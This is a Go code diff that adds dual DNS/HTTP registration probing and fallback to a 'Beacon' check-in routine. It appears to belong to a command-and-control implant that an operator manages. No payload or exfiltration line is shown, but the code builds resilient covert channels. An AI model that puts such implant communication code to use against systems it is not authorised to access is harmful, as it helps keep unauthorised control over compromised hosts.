@@ -240,6 +240,17 @@ func (b *Beacon) checkIn() (string, error) {
 	// Registration uses registration-phase config
 	regPhase := b.client.config.GetRegistrationPhase()
 
+	// Dual, non-staged: prove both transports before committing to a mode. If
+	// only one answers, registerDual latches to it; the operator can re-enable
+	// the other side later from beacon management.
+	if b.transport != nil && b.transport.Mode() == transportDual && !b.client.config.StagedRegistration {
+		if !b.registerDual(checkInData, regPhase) {
+			return "", fmt.Errorf("check-in failed: neither DNS nor HTTP registration was answered")
+		}
+		b.regStage.Store(3)
+		return "ACK", nil
+	}
+
 	// HTTP carrier: register over HTTP first, so the server knows this beacon
 	// before it is asked to signal tasks over DNS. This applies to both http and
 	// dual mode - in dual mode DNS is reserved for the readiness signal.
@@ -596,6 +607,51 @@ func (b *Beacon) sendControlMessage(message string, phase PhaseConfig) (string, 
 		return "", err
 	}
 	return b.client.sendPhaseCommand(message, phase)
+}
+
+// dualProbeRetries is how many times a dual beacon retries a transport whose
+// registration probe failed before latching to the working one.
+const dualProbeRetries = 3
+
+// probeRegistration sends one registration message over a single transport and
+// reports whether it was answered. "dns" uses the DNS path; "http" sends the
+// register operation over the HTTP transport. Each is retried a few times so a
+// single dropped packet does not wrongly mark a live transport dead.
+func (b *Beacon) probeRegistration(kind, checkInData string, regPhase PhaseConfig) bool {
+	for attempt := 0; attempt < dualProbeRetries; attempt++ {
+		var err error
+		switch kind {
+		case "dns":
+			_, err = b.client.sendPhaseCommand(checkInData, regPhase)
+		case "http":
+			if b.transport == nil {
+				return false
+			}
+			timestamp := fmt.Sprintf("%05d", time.Now().Unix()%100000)
+			_, err = b.transport.Send(operationForMessage(checkInData), checkInData+"|"+timestamp)
+		default:
+			return false
+		}
+		if err == nil {
+			return true
+		}
+	}
+	return false
+}
+
+// registerDual proves both transports at startup, then latches to the working
+// one if only a single transport answered. Returning true means at least one
+// transport registered the beacon; the caller has nothing more to do.
+func (b *Beacon) registerDual(checkInData string, regPhase PhaseConfig) bool {
+	if b.transport == nil {
+		return false
+	}
+	dnsOK := b.probeRegistration("dns", checkInData, regPhase)
+	httpOK := b.probeRegistration("http", checkInData, regPhase)
+	if mode := dualModeFromProbes(dnsOK, httpOK); mode != transportDual {
+		b.transport.LatchTo(mode)
+	}
+	return dnsOK || httpOK
 }
 
 // parseTask parses a task from the DNS server response.
